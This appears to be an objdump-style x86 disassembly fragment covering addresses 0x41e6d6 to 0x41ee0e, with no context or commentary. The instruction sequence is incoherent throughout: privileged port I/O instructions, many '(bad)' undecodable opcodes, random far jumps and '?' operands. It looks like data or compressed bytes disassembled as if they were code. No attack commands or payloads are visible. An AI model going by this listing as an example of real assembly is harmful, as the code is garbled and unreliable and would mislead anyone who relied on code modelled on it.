  41e6d6:	outs   dx,DWORD PTR ds:[esi]
  41e6d7:	adc    BYTE PTR [ecx+0x5df525a0],cl
  41e6dd:	test   BYTE PTR [edx+eax*8],cl
  41e6e0:	cwde   
  41e6e1:	fcomp  st(5)
  41e6e3:	cmp    al,bl
  41e6e5:	out    dx,eax
  41e6e6:	fisub  DWORD PTR [ebp-0x7a01995e]
  41e6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ee:	gs mov ebp,0xfd08fd8d
  41e6f4:	mov    bl,ah
  41e6f6:	jecxz  0x41e713
  41e6f8:	pop    edi
  41e6f9:	icebp  
  41e6fa:	sub    ch,BYTE PTR [ebp-0x35]
  41e6fd:	mov    dl,0x4a
  41e6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e700:	adc    BYTE PTR [ebx],al
  41e702:	dec    edi
  41e703:	in     eax,0x6e
  41e705:	push   cs
  41e706:	retf   
  41e707:	add    eax,0x5b684d92
  41e70c:	sbb    esp,0x5a
  41e70f:	sar    DWORD PTR [edx],cl
  41e711:	in     al,dx
  41e712:	lods   eax,DWORD PTR ds:[esi]
  41e713:	mov    WORD PTR [edx+0x23aab9d2],?
  41e719:	jbe    0x41e6a2
  41e71b:	leave  
  41e71c:	std    
  41e71d:	int3   
  41e71e:	in     al,0x9e
  41e720:	mov    dl,0xaf
  41e722:	imul   esp,DWORD PTR [ebx],0xffffff94
  41e725:	stc    
  41e726:	jb     0x41e7a5
  41e728:	pop    ebp
  41e729:	push   eax
  41e72a:	mov    al,0xa2
  41e72c:	pop    esp
  41e72d:	add    BYTE PTR [esp+edx*8+0x380ecf2b],bh
  41e734:	(bad)  
  41e735:	hlt    
  41e736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e737:	mov    esp,ebp
  41e739:	mov    al,ds:0x63ed922d
  41e73e:	stos   BYTE PTR es:[edi],al
  41e73f:	adc    eax,esp
  41e741:	cs scas eax,DWORD PTR es:[edi]
  41e743:	pushf  
  41e744:	repnz mov ch,0xb1
  41e747:	mov    ecx,0xab31ddf2
  41e74c:	(bad)  
  41e74e:	fwait
  41e74f:	out    0x4d,al
  41e751:	inc    ebp
  41e752:	xlat   BYTE PTR ds:[ebx]
  41e753:	mov    ds:0x19c0f7af,eax
  41e758:	std    
  41e759:	dec    edx
  41e75a:	or     DWORD PTR [ebp+ebp*2+0x66],0xeec19818
  41e762:	add    eax,0x39339db5
  41e767:	and    BYTE PTR [ecx+0x3f],0xb
  41e76b:	sub    esi,esp
  41e76d:	sar    DWORD PTR [esi+0x5e41644b],0x82
  41e774:	or     esp,DWORD PTR [eax-0x80]
  41e777:	cmp    BYTE PTR [ecx+ecx*2+0x1e],dh
  41e77b:	jo     0x41e752
  41e77d:	out    0x48,al
  41e77f:	jbe    0x41e788
  41e781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e782:	cmp    eax,0x3ecca70b
  41e787:	imul   edx,DWORD PTR [ebp-0x1b],0x93af3ea6
  41e78e:	mov    bh,0x6d
  41e790:	add    BYTE PTR [ebx+edx*2],dl
  41e793:	out    0x1b,eax
  41e795:	xor    BYTE PTR [esi],bl
  41e797:	add    ecx,DWORD PTR [ebp-0x44cabf6d]
  41e79d:	in     eax,0xa2
  41e79f:	add    al,0x87
  41e7a1:	sub    eax,0xeb175e90
  41e7a6:	ret    0x1e9a
  41e7a9:	daa    
  41e7aa:	fst    DWORD PTR [ebx]
  41e7ac:	sbb    BYTE PTR [ebx+0x51],0x85
  41e7b0:	xchg   esp,eax
  41e7b1:	fs xchg edi,eax
  41e7b3:	scas   eax,DWORD PTR es:[edi]
  41e7b4:	sbb    BYTE PTR [eax+0x7de8eace],ch
  41e7ba:	adc    eax,0x5cee1515
  41e7bf:	and    al,0xc7
  41e7c1:	jmp    0xd5db:0x6c8a666d
  41e7c8:	daa    
  41e7c9:	pusha  
  41e7ca:	inc    eax
  41e7cb:	aaa    
  41e7cc:	je     0x41e7f2
  41e7ce:	xor    BYTE PTR [edx+0x51],0x4b
  41e7d2:	icebp  
  41e7d3:	mov    DWORD PTR [edx+0x598f0c13],edx
  41e7d9:	pop    edi
  41e7da:	add    al,0x5f
  41e7dc:	lds    ecx,FWORD PTR [ebp+0x1f3c69cf]
  41e7e2:	inc    ecx
  41e7e3:	loop   0x41e816
  41e7e5:	add    eax,0x6826d892
  41e7ea:	fldcw  WORD PTR [esi-0x6b]
  41e7ed:	addr16 aaa 
  41e7ef:	popf   
  41e7f0:	sub    al,bl
  41e7f2:	inc    ebp
  41e7f3:	and    eax,0x1a643540
  41e7f8:	xor    BYTE PTR [ebp-0xa],ah
  41e7fb:	and    al,bh
  41e7fd:	retf   0x7c
  41e800:	and    al,0x38
  41e802:	popf   
  41e803:	imul   esp,DWORD PTR [ecx],0xba12726a
  41e809:	mov    eax,0x248e9e84
  41e80e:	xchg   ebx,eax
  41e80f:	pop    ebp
  41e810:	pop    ebx
  41e811:	push   es
  41e812:	nop
  41e813:	nop
  41e814:	(bad)  
  41e815:	fisttp DWORD PTR [ebp+0x8]
  41e818:	push   ecx
  41e819:	sub    al,0x48
  41e81b:	push   esi
  41e81c:	cmp    eax,DWORD PTR [ebx-0x16]
  41e81f:	in     eax,dx
  41e820:	out    0x10,al
  41e822:	push   es
  41e823:	test   dl,al
  41e825:	mov    al,ds:0x6634c5f
  41e82a:	sahf   
  41e82b:	in     eax,dx
  41e82c:	pop    ecx
  41e82d:	inc    eax
  41e82e:	xchg   esp,eax
  41e82f:	retf   0x435
  41e832:	and    BYTE PTR [esi-0xb],ah
  41e835:	push   ss
  41e836:	sub    dl,BYTE PTR ds:0x75b05ede
  41e83c:	maskmovq mm5,(bad)
  41e83d:	imul   DWORD PTR [ecx+0x30]
  41e840:	or     bl,bl
  41e842:	dec    esp
  41e843:	push   ds
  41e844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e845:	dec    ebx
  41e846:	jo     0x41e8b9
  41e848:	sbb    ecx,eax
  41e84a:	fld    QWORD PTR [ebx-0x4a3800e3]
  41e850:	enter  0xf8f4,0xe9
  41e854:	push   edx
  41e855:	or     al,0x60
  41e857:	cmp    eax,0x13556f98
  41e85c:	lods   al,BYTE PTR ds:[esi]
  41e85d:	icebp  
  41e85e:	adc    al,0xf1
  41e860:	fnstsw WORD PTR [ebp-0x4efe078d]
  41e866:	pop    eax
  41e867:	out    dx,eax
  41e868:	inc    edi
  41e869:	push   edi
  41e86a:	and    BYTE PTR [esi],0xa7
  41e86d:	xor    DWORD PTR [edx+edi*8],0xffffffc4
  41e871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e872:	enter  0x6340,0xdc
  41e876:	sbb    al,0x22
  41e878:	sub    BYTE PTR [esi],bh
  41e87a:	mov    ah,0x32
  41e87c:	out    dx,al
  41e87d:	stos   BYTE PTR es:[edi],al
  41e87e:	xchg   ebx,eax
  41e87f:	and    ch,bh
  41e881:	out    dx,al
  41e882:	pop    esi
  41e883:	jl     0x41e895
  41e885:	ret    0x33a0
  41e888:	mov    ecx,0x4fffc4da
  41e88d:	cmp    eax,0x272721d7
  41e892:	push   esi
  41e893:	aas    
  41e894:	in     al,dx
  41e895:	xadd   DWORD PTR [edx-0x1af795f8],edx
  41e89c:	push   0x429e7b80
  41e8a1:	pop    esi
  41e8a2:	jae    0x41e830
  41e8a4:	or     edi,DWORD PTR [esi-0x11]
  41e8a7:	jmp    0xc58b:0xd0be1742
  41e8ae:	popa   
  41e8af:	dec    esp
  41e8b0:	jecxz  0x41e8a3
  41e8b2:	hlt    
  41e8b3:	dec    ebx
  41e8b4:	lahf   
  41e8b5:	xor    eax,0x448c239c
  41e8ba:	inc    ecx
  41e8bb:	lea    ebp,[eax+0x7c771bf3]
  41e8c1:	sti    
  41e8c2:	mov    ch,BYTE PTR [esi-0x9acfbc9]
  41e8c8:	mov    cl,0x95
  41e8ca:	mov    bh,0x50
  41e8cc:	ins    BYTE PTR es:[edi],dx
  41e8cd:	mov    BYTE PTR [esp+ebp*8-0x60],ch
  41e8d1:	cmp    eax,0x334a4288
  41e8d6:	dec    edi
  41e8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8d8:	ret    0xf20f
  41e8db:	jae    0x41e953
  41e8dd:	repz fld1 
  41e8e0:	ins    DWORD PTR es:[edi],dx
  41e8e1:	stos   DWORD PTR es:[edi],eax
  41e8e2:	lahf   
  41e8e3:	std    
  41e8e4:	mov    ecx,0x79a358f5
  41e8e9:	pop    edx
  41e8ea:	cdq    
  41e8eb:	push   esp
  41e8ec:	push   0x11
  41e8ee:	sub    eax,0x731d6df1
  41e8f3:	data16 sbb bh,BYTE PTR [esi]
  41e8f6:	sti    
  41e8f7:	and    ebx,ebx
  41e8f9:	push   ebx
  41e8fa:	adc    BYTE PTR [eax-0x1ab51846],cl
  41e900:	jge    0x41e8dc
  41e902:	xor    DWORD PTR [ebp-0x4f],edx
  41e905:	jae    0x41e8fe
  41e907:	or     al,0xf6
  41e909:	shl    DWORD PTR [ecx],cl
  41e90b:	call   FWORD PTR [ecx]
  41e90d:	jae    0x41e940
  41e90f:	into   
  41e910:	and    ch,BYTE PTR [edx]
  41e912:	sub    bh,BYTE PTR [esi+esi*1-0x2d]
  41e916:	adc    ecx,edi
  41e918:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41e91a:	repnz push esp
  41e91c:	ja     0x41e90c
  41e91e:	iret   
  41e91f:	test   eax,0xde7b5b9
  41e924:	jno    0x41e97e
  41e926:	cmp    esi,DWORD PTR [ecx+edi*2+0x4b]
  41e92a:	push   edx
  41e92b:	xor    ecx,DWORD PTR [edx+0x1ab879cb]
  41e931:	outs   dx,DWORD PTR ds:[esi]
  41e932:	data16 cli 
  41e934:	(bad)  
  41e935:	int    0xc
  41e937:	xor    eax,0x8ef20e5b
  41e93c:	je     0x41e985
  41e93e:	xchg   ebp,eax
  41e93f:	clc    
  41e940:	push   ds
  41e941:	aas    
  41e942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e943:	cmp    ah,BYTE PTR [eax+0x36]
  41e946:	sub    DWORD PTR [ecx-0x7],esp
  41e949:	mov    esi,0xb1447d77
  41e94e:	mov    esp,0xd693a0ee
  41e953:	pop    ss
  41e954:	jae    0x41e91a
  41e956:	aaa    
  41e957:	fs lahf 
  41e959:	mov    dl,0x34
  41e95b:	cmp    BYTE PTR [edx+0x20],cl
  41e95e:	dec    edx
  41e95f:	js     0x41e932
  41e961:	sbb    al,0xa5
  41e963:	retf   0x1895
  41e966:	xchg   BYTE PTR [edx-0x4653c259],dh
  41e96c:	rcl    DWORD PTR [edi],cl
  41e96e:	daa    
  41e96f:	shl    BYTE PTR [edi-0x2ac6e34c],cl
  41e975:	lods   al,BYTE PTR ds:[esi]
  41e976:	jmp    0x41e952
  41e978:	and    bl,0x8a
  41e97b:	call   0xe4da:0xfd9198dd
  41e982:	out    0xe7,al
  41e984:	push   edi
  41e985:	xchg   ebp,eax
  41e986:	fadd   QWORD PTR [ebx-0x49164d96]
  41e98c:	lock (bad) 
  41e98e:	jle    0x41e99f
  41e990:	xchg   edi,eax
  41e991:	es xchg esp,eax
  41e993:	adc    BYTE PTR [esi-0x1d],al
  41e996:	mov    bh,0xa8
  41e998:	adc    eax,0x19af7a1e
  41e99d:	add    esp,DWORD PTR [edx]
  41e99f:	shr    BYTE PTR [ecx-0x33e00ec1],cl
  41e9a5:	jb     0x41e9ee
  41e9a7:	jecxz  0x41e994
  41e9a9:	inc    edx
  41e9aa:	push   ecx
  41e9ab:	push   ebp
  41e9ac:	push   ds
  41e9ad:	inc    ebx
  41e9ae:	jmp    0xc79d:0xcda6c374
  41e9b5:	(bad)  
  41e9b6:	out    0xdd,al
  41e9b8:	dec    eax
  41e9b9:	inc    ebp
  41e9ba:	mov    al,ds:0x20c3d2c5
  41e9bf:	mov    BYTE PTR [ebx],ah
  41e9c1:	pushf  
  41e9c2:	push   edi
  41e9c3:	adc    DWORD PTR [ebp+0x7a28ae31],ebx
  41e9c9:	mov    eax,DWORD PTR [edi+0x6c]
  41e9cc:	(bad)  
  41e9cd:	aad    0xac
  41e9cf:	sbb    al,0x31
  41e9d1:	sbb    ebx,0x3d
  41e9d4:	jno    0x41ea54
  41e9d6:	pop    edi
  41e9d7:	test   DWORD PTR [ebp-0x53],0x5425361a
  41e9de:	adc    BYTE PTR [edx-0x3272d934],0x1b
  41e9e5:	(bad)  
  41e9e6:	test   al,0x60
  41e9e8:	popf   
  41e9e9:	adc    DWORD PTR [esi-0xa5398],0x24b63772
  41e9f3:	jmp    0x2a8b:0x904dd244
  41e9fa:	cs std 
  41e9fc:	sub    esp,DWORD PTR [esi+0x39238b4a]
  41ea02:	adc    eax,0x8d77d657
  41ea07:	mov    edx,0x23410cc4
  41ea0c:	call   0x769c797
  41ea11:	inc    ecx
  41ea12:	lock movaps xmm1,xmm1
  41ea16:	xchg   DWORD PTR [ebx],ebx
  41ea18:	mov    bl,BYTE PTR [ecx-0x269a497d]
  41ea1e:	or     DWORD PTR [eax-0xa],ebx
  41ea21:	mov    ?,WORD PTR ds:0xae27f28f
  41ea27:	mov    edx,0x7f2a1
  41ea2c:	int3   
  41ea2d:	add    al,0x2d
  41ea2f:	enter  0x9d24,0xa4
  41ea33:	and    BYTE PTR [ebx-0x40],ch
  41ea36:	(bad)  
  41ea38:	xchg   ebp,eax
  41ea39:	ja     0x41ea1a
  41ea3b:	inc    ecx
  41ea3c:	or     DWORD PTR [ebx-0x7a],esi
  41ea3f:	mov    eax,ds:0x9b59eba7
  41ea44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea45:	jge    0x41e9f2
  41ea47:	mov    al,gs:0xcb450136
  41ea4d:	adc    al,0x10
  41ea4f:	pop    ebp
  41ea50:	xor    ecx,DWORD PTR [eax]
  41ea52:	in     eax,0xb6
  41ea54:	xlat   BYTE PTR ds:[ebx]
  41ea55:	cs mov ah,0xe4
  41ea58:	inc    DWORD PTR [edi+0x51bf018e]
  41ea5e:	lea    eax,[ebx]
  41ea60:	and    eax,0xc7254f9c
  41ea65:	iret   
  41ea66:	jne    0x41ea45
  41ea68:	ret    
  41ea69:	pop    eax
  41ea6a:	imul   ecx,DWORD PTR [ebp+0x23],0xf988a74b
  41ea71:	daa    
  41ea72:	xchg   esp,eax
  41ea73:	xlat   BYTE PTR ds:[ebx]
  41ea74:	pop    ss
  41ea75:	lods   al,BYTE PTR ds:[esi]
  41ea76:	nop
  41ea77:	jg     0x41ea73
  41ea79:	mov    eax,0x55f079b2
  41ea7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea7f:	ret    0xe057
  41ea82:	stos   DWORD PTR es:[edi],eax
  41ea83:	rol    cl,1
  41ea85:	fstp   DWORD PTR [ebp-0x69]
  41ea88:	outs   dx,BYTE PTR ds:[esi]
  41ea89:	in     al,dx
  41ea8a:	or     BYTE PTR [ecx],0xe5
  41ea8d:	(bad)  [ebx-0x11]
  41ea90:	outs   dx,BYTE PTR ds:[esi]
  41ea91:	add    cl,BYTE PTR [eax]
  41ea93:	les    esi,FWORD PTR [ebp+0x7af8a2a1]
  41ea99:	daa    
  41ea9a:	fprem  
  41ea9c:	test   al,0xb2
  41ea9e:	push   ds
  41ea9f:	sti    
  41eaa0:	shr    BYTE PTR [edi-0x6ca87b44],0xde
  41eaa7:	lock sti 
  41eaa9:	fiadd  WORD PTR [eax+0x7378c408]
  41eaaf:	mov    fs,edi
  41eab1:	push   ebp
  41eab2:	xchg   ebp,eax
  41eab3:	stos   BYTE PTR es:[edi],al
  41eab4:	aad    0x8a
  41eab6:	or     DWORD PTR [esp+ebx*8-0x2a],edi
  41eaba:	cdq    
  41eabb:	clc    
  41eabc:	xor    BYTE PTR [eax],0x75
  41eabf:	fcomp  DWORD PTR ds:0xeb801a51
  41eac5:	jge    0x41eabc
  41eac7:	jo     0x41eb28
  41eac9:	fisttp DWORD PTR [ebx]
  41eacb:	shr    DWORD PTR [eax+0x7f],0x51
  41eacf:	shl    BYTE PTR [edx+ebp*2-0x14],cl
  41ead3:	inc    esi
  41ead4:	data16 xor al,0xab
  41ead7:	jle    0x41eaa4
  41ead9:	inc    ecx
  41eada:	je     0x41ea9d
  41eadc:	inc    edx
  41eadd:	ss ret 0x7d88
  41eae1:	jb     0x41eb52
  41eae3:	mov    fs,WORD PTR [esi+0x4224a53a]
  41eae9:	adc    BYTE PTR [edi-0x7238d891],bh
  41eaef:	xchg   edi,eax
  41eaf0:	adc    eax,0x92ead6f
  41eaf5:	cmp    al,0x29
  41eaf7:	addr16 rol esi,1
  41eafa:	xor    esi,DWORD PTR [edi-0xc36954a]
  41eb00:	stos   BYTE PTR es:[edi],al
  41eb01:	pusha  
  41eb02:	fsub   st(1),st
  41eb04:	arpl   di,di
  41eb06:	jnp    0x41eb62
  41eb08:	add    eax,0xd0dda10c
  41eb0d:	pop    edi
  41eb0e:	and    ecx,edi
  41eb10:	retf   0x617c
  41eb13:	inc    ebx
  41eb14:	and    edi,DWORD PTR [eax+0x66]
  41eb17:	cmp    eax,0x7478e2b4
  41eb1c:	out    dx,eax
  41eb1d:	in     eax,dx
  41eb1e:	and    eax,0x7da396e2
  41eb23:	pop    es
  41eb24:	push   es
  41eb25:	xor    dl,BYTE PTR ds:0x17371273
  41eb2b:	xchg   DWORD PTR [ebx],esp
  41eb2d:	push   edi
  41eb2e:	add    BYTE PTR [eax-0x1118a795],al
  41eb34:	scas   eax,DWORD PTR es:[edi]
  41eb35:	div    BYTE PTR [ecx]
  41eb37:	jp     0x41eb7b
  41eb39:	(bad)  
  41eb3a:	in     al,dx
  41eb3b:	mov    bh,0xa1
  41eb3d:	xchg   edx,eax
  41eb3e:	sub    ebx,edx
  41eb40:	aaa    
  41eb41:	mov    dh,0x2d
  41eb43:	into   
  41eb44:	push   edi
  41eb45:	mov    esp,0x7aacf015
  41eb4a:	in     al,dx
  41eb4b:	je     0x41eb2f
  41eb4d:	mov    esi,0xf411a93e
  41eb52:	xchg   DWORD PTR [esi-0x76e7e0ce],esp
  41eb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb59:	xchg   ecx,eax
  41eb5a:	sub    eax,0xac255ecc
  41eb5f:	push   ebx
  41eb60:	or     BYTE PTR [ecx],cl
  41eb62:	dec    ebx
  41eb63:	cmc    
  41eb64:	scas   eax,DWORD PTR es:[edi]
  41eb65:	retf   
  41eb66:	scas   al,BYTE PTR es:[edi]
  41eb67:	out    dx,al
  41eb68:	add    al,0xe5
  41eb6a:	test   eax,0x89a9127a
  41eb6f:	loopne 0x41eb15
  41eb71:	retf   0xa2a4
  41eb74:	push   ds
  41eb75:	stc    
  41eb76:	and    BYTE PTR [eax-0x799617a2],dl
  41eb7c:	mov    ch,0x9d
  41eb7e:	faddp  st(5),st
  41eb80:	mov    cl,0x5a
  41eb82:	(bad)  
  41eb83:	mov    ds:0x3fc5973c,al
  41eb88:	clc    
  41eb89:	out    dx,al
  41eb8a:	cwde   
  41eb8b:	call   0x9e233c39
  41eb90:	push   edx
  41eb91:	mov    gs,WORD PTR [edx+0x5d394a51]
  41eb97:	sub    DWORD PTR [edx+0x43ce70e0],edi
  41eb9d:	sub    eax,0x61cf5806
  41eba2:	sar    BYTE PTR [ebx+eiz*4+0x65],0xa6
  41eba7:	lods   al,BYTE PTR ds:[esi]
  41eba8:	loope  0x41eb92
  41ebaa:	inc    esi
  41ebab:	lods   al,BYTE PTR ds:[esi]
  41ebac:	push   ds
  41ebad:	rcl    BYTE PTR [esi-0x40],cl
  41ebb0:	ror    BYTE PTR [ecx-0x6d],cl
  41ebb3:	in     al,0xd5
  41ebb5:	add    edi,DWORD PTR ds:0xf3e38b72
  41ebbb:	lds    edx,FWORD PTR [ebp-0x1e]
  41ebbe:	aas    
  41ebbf:	push   edx
  41ebc0:	mov    al,ds:0x5d56f10c
  41ebc5:	addr16 inc ecx
  41ebc7:	adc    BYTE PTR [eax+0x1530123c],0x53
  41ebce:	mov    ch,0x6e
  41ebd0:	and    BYTE PTR [edx+eiz*8-0x3e25f18],0x9c
  41ebd8:	mov    edx,0x2b68a4ab
  41ebdd:	dec    esp
  41ebde:	fnstcw WORD PTR ds:0x1d91bd58
  41ebe4:	sub    cl,0x1c
  41ebe7:	sti    
  41ebe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebe9:	mov    fs,WORD PTR [ebx]
  41ebeb:	push   es
  41ebec:	dec    ebx
  41ebed:	shl    BYTE PTR [ebp-0x2d],cl
  41ebf0:	jo     0x41ec33
  41ebf2:	or     ebx,DWORD PTR [ecx-0x308c87b0]
  41ebf8:	hlt    
  41ebf9:	lods   al,BYTE PTR ds:[esi]
  41ebfa:	ins    DWORD PTR es:[edi],dx
  41ebfb:	addr16 lock ret 
  41ebfe:	mov    edx,ebp
  41ec00:	scas   eax,DWORD PTR es:[edi]
  41ec01:	adc    eax,0xe312bb64
  41ec06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec07:	xchg   esp,eax
  41ec08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec09:	jmp    DWORD PTR [ebp-0x5a4dc0ad]
  41ec0f:	in     eax,0xd7
  41ec11:	iret   
  41ec12:	sub    BYTE PTR [ecx+0x2fad0c48],ah
  41ec18:	xchg   ecx,eax
  41ec19:	adc    BYTE PTR [eax+0x1819b962],cl
  41ec1f:	push   ebp
  41ec20:	ret    
  41ec21:	jp     0x41ec7c
  41ec23:	cwde   
  41ec24:	stos   BYTE PTR es:[edi],al
  41ec25:	js     0x41ec00
  41ec27:	fdivrp st(2),st
  41ec29:	sub    al,0xf2
  41ec2b:	dec    ebx
  41ec2c:	sahf   
  41ec2d:	mov    edx,0x7df2a1ad
  41ec32:	sub    edx,ebx
  41ec34:	push   esi
  41ec35:	add    BYTE PTR [ecx+edi*8-0x438cb93e],ch
  41ec3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec3d:	inc    esp
  41ec3e:	pop    esi
  41ec3f:	xor    al,0xdc
  41ec41:	xlat   BYTE PTR ds:[ebx]
  41ec42:	push   ecx
  41ec43:	jbe    0x41ecc0
  41ec45:	and    DWORD PTR [edi+0x138e5850],0x9f1710bd
  41ec4f:	xchg   ecx,eax
  41ec50:	stc    
  41ec51:	adc    bh,ah
  41ec53:	mov    ss,WORD PTR [ebp+0x59847760]
  41ec59:	adc    eax,0xd15d60b
  41ec5e:	lock mov WORD PTR [ecx+0x4b],?
  41ec62:	inc    ebp
  41ec63:	scas   al,BYTE PTR es:[edi]
  41ec64:	imul   eax,DWORD PTR [ecx+0x42],0x72fb5742
  41ec6b:	xchg   esp,eax
  41ec6c:	ds retf 
  41ec6e:	repnz aam 0x91
  41ec71:	jb     0x41ec65
  41ec73:	cmp    dl,BYTE PTR [edi]
  41ec75:	xchg   BYTE PTR ss:[ebx-0x80],dl
  41ec79:	xchg   esi,eax
  41ec7a:	(bad)  
  41ec7b:	cwde   
  41ec7c:	xchg   esi,eax
  41ec7d:	das    
  41ec7e:	push   ecx
  41ec7f:	jns    0x41ecf3
  41ec81:	jnp    0x41ece0
  41ec83:	arpl   WORD PTR [edi],si
  41ec85:	xor    DWORD PTR [ebp-0x29],edi
  41ec88:	or     BYTE PTR [edi-0x2e14641],bl
  41ec8e:	jne    0x41ec33
  41ec90:	sbb    eax,0x6006e5ee
  41ec95:	and    al,0xd6
  41ec97:	(bad)  
  41ec98:	lock int 0xb6
  41ec9b:	adc    DWORD PTR [ecx],ecx
  41ec9d:	imul   edx,DWORD PTR [ebx],0xffffffca
  41eca0:	xor    BYTE PTR [ebx+edi*4+0x5e81515],al
  41eca7:	add    cl,ah
  41eca9:	popf   
  41ecaa:	lods   al,BYTE PTR ds:[esi]
  41ecab:	cmp    DWORD PTR [edx+0x1f],0xffffffb2
  41ecaf:	sub    DWORD PTR [edx+0x20c8104c],esp
  41ecb5:	push   ds
  41ecb6:	loope  0x41eca4
  41ecb8:	push   esi
  41ecb9:	gs daa 
  41ecbb:	(bad)
  41ecbe:	pop    ebx
  41ecbf:	sub    edx,DWORD PTR ss:[esi-0x28]
  41ecc3:	or     al,BYTE PTR [esi-0x3ae3dcd3]
  41ecc9:	sub    BYTE PTR [edx-0x6a],dl
  41eccc:	mov    cl,0xaf
  41ecce:	in     eax,dx
  41eccf:	sbb    eax,0xa1d501c4
  41ecd4:	add    eax,0xd5abad78
  41ecd9:	inc    ecx
  41ecda:	mov    dl,0x9c
  41ecdc:	jnp    0x41ed1b
  41ecde:	mov    ebp,0xe7e06466
  41ece3:	xchg   dl,dl
  41ece5:	xchg   DWORD PTR cs:[edi],esp
  41ece8:	xor    al,0x42
  41ecea:	es jle 0x41ed27
  41eced:	xor    al,0x78
  41ecef:	(bad)  
  41ecf0:	hlt    
  41ecf1:	sahf   
  41ecf2:	cmp    al,0x92
  41ecf4:	sub    eax,0xe6a26233
  41ecf9:	(bad)  
  41ecfa:	xor    BYTE PTR [eax],cl
  41ecfc:	xor    cl,BYTE PTR [ecx]
  41ecfe:	add    eax,0xa74cffc6
  41ed03:	nop
  41ed04:	xchg   BYTE PTR [ebx+0x3],cl
  41ed07:	out    dx,eax
  41ed08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed09:	push   es
  41ed0a:	mov    esi,0x15b6c972
  41ed0f:	test   esi,edi
  41ed11:	mov    WORD PTR [edx+edi*2+0x3082651f],ds
  41ed18:	dec    esp
  41ed19:	loopne 0x41ed5f
  41ed1b:	or     eax,0x1568ec2c
  41ed20:	jecxz  0x41ed01
  41ed22:	das    
  41ed23:	ins    DWORD PTR es:[edi],dx
  41ed24:	adc    edx,DWORD PTR [ecx+0x294deebe]
  41ed2a:	or     al,0x5a
  41ed2c:	pop    ss
  41ed2d:	jg     0x41ed0e
  41ed2f:	scas   eax,DWORD PTR es:[edi]
  41ed30:	jno    0x41ed21
  41ed32:	imul   ebx,DWORD PTR [edi+edi*8],0xffffffe4
  41ed36:	mov    edi,0xebd8f664
  41ed3b:	aaa    
  41ed3c:	fimul  DWORD PTR [eax-0x53]
  41ed3f:	add    al,0x1e
  41ed41:	mov    edi,0x9a51d151
  41ed46:	fs out dx,al
  41ed48:	ret    
  41ed49:	adc    al,0x56
  41ed4b:	retf   
  41ed4c:	or     al,0xb3
  41ed4e:	push   0xffffffc0
  41ed50:	imul   esi,DWORD PTR [edx],0x69
  41ed53:	sub    DWORD PTR [edi-0x3b6473ea],edx
  41ed59:	out    0x81,eax
  41ed5b:	jecxz  0x41ece8
  41ed5d:	and    eax,0x685d1379
  41ed62:	(bad)  
  41ed63:	shl    BYTE PTR [esp+edx*2+0x51],cl
  41ed67:	sbb    ebp,DWORD PTR [ebx+0x2893162c]
  41ed6d:	mov    esp,0xf72aaffa
  41ed72:	or     eax,0xae6d2bf6
  41ed77:	push   cs
  41ed78:	aaa    
  41ed79:	jmp    0x6bc644ce
  41ed7e:	push   ss
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	aam    0xb8
  41ed82:	(bad)  
  41ed83:	in     eax,0x43
  41ed85:	sti    
  41ed86:	gs dec edi
  41ed88:	loopne 0x41edee
  41ed8a:	out    dx,eax
  41ed8b:	push   edi
  41ed8c:	int    0xf1
  41ed8e:	inc    ebp
  41ed8f:	cmp    eax,DWORD PTR [ecx+0x78bce231]
  41ed95:	rol    BYTE PTR [ebx-0x4b],cl
  41ed98:	nop
  41ed99:	outs   dx,BYTE PTR es:[si]
  41ed9c:	jb     0x41ed60
  41ed9e:	or     ebx,DWORD PTR [eax]
  41eda0:	jbe    0x41edd8
  41eda2:	xchg   esp,eax
  41eda3:	inc    ecx
  41eda4:	push   esi
  41eda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eda6:	jbe    0x41eda5
  41eda8:	je     0x41ed8e
  41edaa:	lock inc ecx
  41edac:	push   ds
  41edad:	ja     0x41ed67
  41edaf:	sbb    BYTE PTR [ebx-0x1d3a1343],cl
  41edb5:	scas   eax,DWORD PTR es:[edi]
  41edb6:	pop    eax
  41edb7:	jne    0x41ed3d
  41edb9:	push   0xfc9ffbd9
  41edbe:	add    esi,ebp
  41edc0:	aam    0xf7
  41edc2:	dec    ebp
  41edc3:	mov    ch,0x84
  41edc5:	les    esp,FWORD PTR [eax-0x6f]
  41edc8:	ret    
  41edc9:	cmp    BYTE PTR [edi+0x31],0x80
  41edcd:	or     ebp,DWORD PTR [edi-0x2a050e52]
  41edd3:	retf   
  41edd4:	dec    edx
  41edd5:	sahf   
  41edd6:	bound  esi,QWORD PTR [edi]
  41edd8:	inc    ebp
  41edd9:	fld    DWORD PTR [ebp+0x62]
  41eddc:	xchg   esi,eax
  41eddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edde:	push   edi
  41eddf:	out    0x8d,al
  41ede1:	add    esi,ecx
  41ede3:	addps  xmm1,xmm0
  41ede6:	mov    ebp,0xab03aea1
  41edeb:	mov    ?,WORD PTR [ebp+0x58f693a5]
  41edf1:	jo     0x41eda1
  41edf3:	pop    esp
  41edf4:	test   BYTE PTR [ecx+eax*8-0x46],ch
  41edf8:	gs push ds
  41edfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edfb:	mov    esp,0xe7651a5b
  41ee00:	sbb    eax,0xf1d4c688
  41ee05:	repnz inc ebx
  41ee07:	dec    edi
  41ee08:	adc    dl,BYTE PTR [ebp-0x3803ff52]
  41ee0e:	pop    edi
